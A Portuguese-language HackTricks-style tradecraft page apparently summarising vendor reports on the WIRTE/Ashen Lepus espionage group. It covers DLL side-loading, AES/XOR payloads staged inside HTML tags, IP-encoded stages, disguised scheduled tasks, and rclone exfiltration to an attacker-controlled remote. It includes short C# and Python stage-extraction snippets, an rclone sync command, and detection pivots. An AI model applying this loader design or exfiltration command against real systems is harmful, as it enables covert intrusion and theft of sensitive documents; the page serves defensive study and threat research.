# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral da Tradecraft

Ashen Lepus (também conhecido como WIRTE) transformou em arma um padrão reutilizável que encadeia DLL sideloading, payloads HTML staged e backdoors .NET modulares para manter persistência em redes diplomáticas do Oriente Médio. A técnica pode ser reutilizada por qualquer operador porque depende de:<sup>[[1]](#references)</sup>

- **Engenharia social baseada em arquivos compactados**: PDFs benignos instruem os alvos a baixar um arquivo RAR de um site de compartilhamento de arquivos. O arquivo contém um visualizador de documentos EXE com aparência legítima, uma DLL maliciosa nomeada como uma biblioteca confiável (por exemplo, `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e um arquivo chamariz `Document.pdf`.
- **Abuso da ordem de pesquisa de DLLs**: a vítima clica duas vezes no EXE, o Windows resolve a importação da DLL a partir do diretório atual, e o loader malicioso (AshenLoader) é executado dentro do processo confiável enquanto o PDF chamariz é aberto para evitar suspeitas.
- **Staging Living-off-the-land**: cada estágio posterior (AshenStager → AshenOrchestrator → modules) é mantido fora do disco até ser necessário, sendo entregue como blobs criptografados ocultos dentro de respostas HTML aparentemente inofensivas.

## Cadeia de Side-Loading em múltiplos estágios

1. **Decoy EXE → AshenLoader**: o EXE faz side-load do AshenLoader, que realiza reconhecimento do host, usa AES-CTR para criptografá-lo e o envia via POST dentro de parâmetros rotativos, como `token=`, `id=`, `q=` ou `auth=`, para caminhos com aparência de API (por exemplo, `/api/v2/account`).<sup>[[1]](#references)</sup>
2. **Extração de HTML**: o C2 só revela o próximo estágio quando o IP do cliente é geolocalizado na região-alvo e o `User-Agent` corresponde ao implant, dificultando a análise por sandboxes. Quando as verificações são aprovadas, o corpo HTTP contém um blob `<headerp>...</headerp>` com o payload AshenStager criptografado com Base64/AES-CTR.
3. **Segundo sideload**: o AshenStager é implantado com outro binário legítimo que importa `wtsapi32.dll`. A cópia maliciosa injetada no binário busca mais HTML, desta vez extraindo `<article>...</article>` para recuperar o AshenOrchestrator.
4. **AshenOrchestrator**: um controlador .NET modular que decodifica uma configuração JSON em Base64. Os campos `tg` e `au` da configuração são concatenados e submetidos a hash para formar a chave AES, que descriptografa `xrk`. Os bytes resultantes funcionam como uma chave XOR para cada blob de módulo baixado posteriormente.
5. **Entrega de módulos**: cada módulo é descrito por meio de comentários HTML que redirecionam o parser para uma tag arbitrária, contornando regras estáticas que procuram apenas `<headerp>` ou `<article>`. Os módulos incluem persistência (`PR*`), uninstallers (`UN*`), reconhecimento (`SN`), captura de tela (`SCT`) e exploração de arquivos (`FE`).

### Padrão de Parsing de Contêiner HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Mesmo que os defensores bloqueiem ou removam um elemento específico, o operador só precisa alterar a tag indicada no comentário HTML para retomar a entrega.<sup>[[1]](#references)</sup>

### Auxiliar de Extração Rápida (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralelos de Evasão com HTML Staging

Pesquisas recentes sobre HTML smuggling (Talos) destacam payloads ocultos como strings Base64 dentro de blocos `<script>` em anexos HTML e decodificados via JavaScript em runtime.<sup>[[2]](#references)</sup> O mesmo truque pode ser reutilizado para respostas C2: armazenar blobs criptografados dentro de uma tag script (ou outro elemento DOM) e decodificá-los em memória antes de aplicar AES/XOR, fazendo a página parecer um HTML comum. Talos também mostra ofuscação em camadas (renomeação de identificadores mais Base64/Caesar/AES) dentro de tags script, o que se aplica diretamente a blobs C2 staged em HTML.<sup>[[2]](#references)</sup> Uma análise posterior da Talos sobre **hidden text salting** também é relevante aqui: dividir Base64 com comentários HTML irrelevantes ou espaços em branco é suficiente para quebrar extractors regex simples, mantendo trivial a reconstrução no lado do navegador.<sup>[[7]](#references)</sup>

## Notas sobre Variantes Recentes (2024-2025)

- A Check Point observou campanhas WIRTE em 2024 que ainda dependiam de sideloading baseado em arquivos compactados, mas usavam `propsys.dll` (stagerx64) como primeiro stage. O stager decodifica o payload seguinte com Base64 + XOR (chave `53`), envia requisições HTTP com um `User-Agent` hardcoded e extrai blobs criptografados incorporados entre tags HTML. Em uma ramificação, o stage era reconstruído a partir de uma longa lista de strings IP incorporadas, decodificadas via `RtlIpv4StringToAddressA` e então concatenadas nos bytes do payload.<sup>[[3]](#references)</sup>
- A OWN-CERT documentou ferramentas WIRTE anteriores nas quais o dropper `wtsapi32.dll` side-loaded protegia strings com Base64 + TEA e usava o próprio nome da DLL como chave de descriptografia; em seguida, ofuscava com XOR/Base64 os dados de identificação do host antes de enviá-los ao C2.<sup>[[4]](#references)</sup>

## Reconstruindo Stages Codificados como IP

A ramificação `propsys.dll` de 2024 do WIRTE mostra que o PE seguinte não precisa existir como um único blob HTML contíguo. O loader pode armazenar os bytes do stage como strings dotted-quad e reconstruí-los com `RtlIpv4StringToAddressA`, um padrão estreitamente relacionado ao tradecraft **IPfuscation** do Hive.<sup>[[3]](#references)[[5]](#references)</sup> Operacionalmente, isso é útil quando o ator quer que a página HTML contenha o que parece ser IOCs ou dados de configuração inofensivos, em vez de um payload Base64 óbvio.
```python
import pathlib, re, socket

text = pathlib.Path("stage.txt").read_text(encoding="utf-8")
ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
blob = b"".join(socket.inet_aton(ip) for ip in ips)
pathlib.Path("stage.bin").write_bytes(blob)
```
Se os bytes recuperados começarem com `MZ`, você provavelmente reconstruiu o próximo PE diretamente. Caso contrário, verifique a existência de uma camada inicial de XOR/Base64 ou de pequenos blocos delimitadores entre os endereços.

## Nomes de DLL intercambiáveis e rotação de hosts

Uma propriedade importante desse padrão é que o **backend de staging HTML/AES/XOR pode permanecer idêntico, enquanto apenas o par de sideload é alterado**. O WIRTE alternou entre `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` e `propsys.dll` em diferentes campanhas, o que é útil porque:<sup>[[1]](#references)[[3]](#references)</sup>

- `propsys.dll` e `wtsapi32.dll` são nomes comuns de DLLs do Windows que os defenders esperam encontrar em `%System32%` / `%SysWOW64%`.
- Catálogos públicos, como o **HijackLibs**, já mapeiam muitos binários que carregarão esses nomes de DLL a partir de um diretório de aplicação copiado, fornecendo aos operators hosts de substituição sem a necessidade de reprojetar o stager.
- Apenas a superfície de exports precisa ser adaptada para cada host. O parser HTML, as rotinas AES/XOR e o module loader normalmente podem ser transplantados sem alterações para uma proxy DLL de forwarding.

Para trabalhos de laboratório ofensivos, isso significa que você pode separar o problema em **(1) encontrar um host assinado estável que resolva localmente o nome de DLL escolhido** e **(2) reutilizar a mesma lógica de HTML staged loader por trás dessa DLL**.

## Hardening de Crypto e C2

- **AES-CTR em todos os lugares**: os loaders atuais incorporam chaves de 256 bits e nonces (por exemplo, `{9a 20 51 98 ...}`) e opcionalmente adicionam uma camada XOR usando strings como `msasn1.dll` antes/depois da descriptografia.<sup>[[1]](#references)</sup>
- **Variações do material de chave**: loaders anteriores usavam Base64 + TEA para proteger strings incorporadas, com a chave de descriptografia derivada do nome da DLL maliciosa (por exemplo, `wtsapi32.dll`).<sup>[[4]](#references)</sup>
- **Separação da infraestrutura + camuflagem de subdomínios**: os staging servers são separados por ferramenta, hospedados em diferentes ASNs e, às vezes, expostos por subdomínios com aparência legítima, de modo que o comprometimento de um stage não exponha o restante.
- **Recon smuggling**: os dados enumerados agora incluem listagens de Program Files para identificar aplicações de alto valor e são sempre criptografados antes de sair do host.
- **Rotação de URI**: os parâmetros de consulta e os caminhos REST alternam entre campanhas (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando detecções frágeis.
- **Fixação de User-Agent + redirects seguros**: a infraestrutura de C2 responde apenas a strings exatas de UA e, caso contrário, redireciona para sites benignos de notícias/saúde para se misturar ao tráfego normal.
- **Gated delivery**: os servers são geo-fenced e respondem apenas a implants reais. Clientes não autorizados recebem HTML inofensivo.

## Persistência e loop de execução

O AshenStager cria scheduled tasks que se passam por jobs de manutenção do Windows e executa por meio do `svchost.exe`, por exemplo:<sup>[[1]](#references)</sup>

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Essas tasks relançam a cadeia de sideload durante o boot ou em intervalos, garantindo que o AshenOrchestrator possa solicitar módulos novos sem tocar novamente no disco.

## Uso de clientes de sincronização benignos para exfiltration

Os operators armazenam documentos diplomáticos em `C:\Users\Public` (legível por todos e não suspeito) por meio de um módulo dedicado e, em seguida, baixam o binário legítimo do [Rclone](https://rclone.org/) para sincronizar esse diretório com o storage do attacker. A Unit42 observa que esta é a primeira vez que esse actor foi observado usando Rclone para exfiltration, alinhando-se à tendência mais ampla de abusar de ferramentas legítimas de sincronização para se misturar ao tráfego normal:<sup>[[1]](#references)</sup>

1. **Stage**: copie/colete os arquivos-alvo em `C:\Users\Public\{campaign}\`.
2. **Configure**: envie uma configuração do Rclone apontando para um endpoint HTTPS controlado pelo attacker (por exemplo, `api.technology-system[.]com`).
3. **Sync**: execute `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` para que o tráfego se pareça com backups normais na cloud.

Como o Rclone é amplamente usado em workflows legítimos de backup, os defenders devem se concentrar em execuções anômalas (novos binários, remotes incomuns ou sincronização repentina de `C:\Users\Public`).

## Pivots de detecção

- Gere alertas para **processos assinados** que carreguem inesperadamente DLLs de caminhos graváveis pelo usuário (filtros do Procmon + `Get-ProcessMitigation -Module`), especialmente quando os nomes das DLLs coincidirem com `netutils`, `srvcli`, `dwampi`, `wtsapi32` ou `propsys`.<sup>[[6]](#references)</sup>
- Inspecione respostas HTTPS suspeitas em busca de **blobs Base64 grandes incorporados em tags incomuns** ou protegidos por comentários `<!-- TAG: <xyz> -->`.
- Normalize o HTML primeiro: **remova comentários e compacte os espaços em branco antes da extração de Base64**, pois a evasão no estilo hidden-text-salting pode dividir payloads entre limites de comentários.
- Amplie a hunting em HTML para **strings Base64 dentro de blocos `<script>`** (staging no estilo HTML smuggling) que são decodificadas por JavaScript antes do processamento AES/XOR.
- Procure chamadas repetidas para **`RtlIpv4StringToAddressA` seguidas pela montagem de buffers**, especialmente quando as strings ao redor forem listas longas de IPv4, e não alvos de rede reais.
- Procure **scheduled tasks** que executem `svchost.exe` com argumentos que não sejam de services ou que apontem para diretórios de droppers.
- Rastreie **redirects de C2** que retornem payloads apenas para strings exatas de `User-Agent` e, caso contrário, redirecionem para domínios legítimos de notícias/saúde.
- Monitore o aparecimento de binários do **Rclone** fora de locais gerenciados pela equipe de IT, novos arquivos `rclone.conf` ou jobs de sincronização que extraiam dados de diretórios de staging como `C:\Users\Public`.

## Referências

- [1] [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [2] [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [3] [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [4] [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
- [5] [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
- [6] [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
- [7] [Seasoning email threats with hidden text salting](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)

{{#include ../../../banners/hacktricks-training.md}}
